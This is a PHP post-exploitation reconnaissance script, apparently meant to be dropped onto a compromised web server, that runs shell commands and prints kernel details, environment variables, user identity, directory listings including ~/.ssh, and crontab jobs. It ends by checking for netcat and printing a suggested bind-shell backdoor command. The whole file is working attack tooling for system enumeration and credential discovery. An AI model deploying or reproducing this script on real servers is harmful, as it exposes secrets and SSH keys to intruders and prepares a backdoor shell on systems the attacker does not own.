/*
Author: Andre. k. Lorenci (gh0sst)
Date: May 29 2020
Contact: https://github.com/gh0st56
*/
<style>
body {
	background-color: black;
}
h1,p {
	color: #33ff33;
}
strong {
	color: #ff471a;
}
</style>
<?php
echo "<h1>PHP Info gathering</h1>";
function osVersion(){
	$cmds = array("v", "r", "n", "p", "s", "o");
	echo "<hr /><br /><strong>OS Version:</strong><br />";
	for($i = 0; $i < count($cmds); $i++){
		$counts =  $cmds[$i];
		$os = shell_exec('uname -'.$counts);
		switch($counts){
			case("v"):
			echo "<p><b>Kernel version:</b> $os</p>";
				break;
			case("r"):
				echo "<p><b>Kernel release:</b> $os</p>";
				break;
			case("n"):
				echo "<p><b>Network node hostname:</b> $os</p>";
				break;
			case("p"):
				echo "<p><b>Processor type:</b> $os</p>";
				break;
			case("s"):
				echo "<p><b>Kernel name:</b> $os</p>";
				break;
			case("o"):
				echo "<p><b>Operational system:</b> $os</p>";
				break;
		}
	}
}
function envVariables(){
	echo "<strong>Enviromental variables: </strong><br />";
	$env = shell_exec("env");
	echo "<p><b>Env:</b> $env</p>";
	$profenv = array("whoami", "echo $0", "id");
	for($x = 0; $x < count($profenv); $x++){
		$cntrl = $profenv[$x];
		$cmd = shell_exec($cntrl);
		switch($cntrl){
			case("whoami"):
				echo "<p><b>Current user:</b> $cmd</p>";
				break;
			case("echo $0"):
				echo "<p><b>Current shell:</b> $cmd</p>";
				break;
			case("id"):
				echo "<p><b>User id:</b> $cmd</p>";
				break;
		}
	}
}
function AppnDir(){
	echo "<strong>Services and Directories: </strong><br />";
	$rservs = shell_exec("ls /home/");
	echo "<p><b>Index of /home/ directory: </b></p>";
	echo "<p>$rservs</p>";
	$rservs = shell_exec("ls -a /");
	echo "<p><b>Index of / directory: </b></p>";
	echo "<p>$rservs</p>";
	if($rservs = shell_exec("ls ~")){
		echo "<p><b>Index of user directory:</b> </p>";
		echo "<p>$rservs</p>";
	}
	if($rservs = shell_exec("ls ~/.ssh")){
		echo "<strong>Important: </strong>";
                echo "<p><b>Index of .ssh directory: </b></p>";
                echo "<p>$rservs</p>";
        }
	if($rservs = shell_exec("crontab -l")){
		echo "<p><b>Crontab jobs:</b> </p>";
		echo "<p>$rservs</p>";
	}else{
		echo "<p><b>Crontab jobs: </b></p>";
		echo "<p>No crontabs available</p>";
	}
	if($rservs = shell_exec("nc -h")){
		echo "<strong>Important: </strong>";
		echo "<p><b>NetCat(nc) Is available.</b></p>";
		echo "<p>Backdoor payload: nc -vnlp -e /bin/bash</p>";
	}
}

osVersion();
envVariables();
AppnDir();

?>
